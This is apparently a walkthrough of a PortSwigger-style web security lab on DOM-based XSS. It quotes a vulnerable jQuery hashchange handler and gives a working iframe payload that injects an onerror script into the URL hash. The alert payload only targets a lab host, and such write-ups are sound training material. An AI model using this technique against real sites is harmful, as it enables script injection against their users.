<h1>DOM XSS in jQuery selector sink using a hashchange event</h1>

The application uses window.location.hash as HTML/jQuery selector content without safely handling it. This allows you to achieve javascript execution by including a payload in the URL as a URL Fragment Hash.

<img width="1590" height="701" alt="xss-vulnerable-hashchange-script-portswigger-lab" src="https://github.com/user-attachments/assets/60ad5345-bb0c-4c3e-94ea-54f3e6522285" />

```
<script>
$(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
</script>
```

<mark>The JQuery Selector waits for a hash change, so the hash will have to change to achieve javascript execution. This is important when delivering the exploit. The page must load with an empty hash, then
a new hash must be loaded.</mark>

We can use an iframe to force the browser to visit the URL and then use an onload attribute to load a new hash after the page loads

1. Store the script on your server

<img width="1346" height="865" alt="dom-xss-jquery-selector-hashchange-event-storing-the-script-for-educational-purposes-only" src="https://github.com/user-attachments/assets/7e3bae2a-0e04-4e16-a3de-a0d2898e47ed" />

```
<iframe src="https://0a3d00d20391e867803a039400d00059.web-security-academy.net/#" onload="this.src+='<img/src/onerror=alert(6942031337)>'"></iframe>
```

2. Test out the script yourself to verify javascript execution

<img width="1586" height="670" alt="dom-xss-jquery-selector-hashchange-event-exploitation-for-educational-purposes-only" src="https://github.com/user-attachments/assets/d819fa8e-4055-49ec-b87d-e3beca76a2f3" />




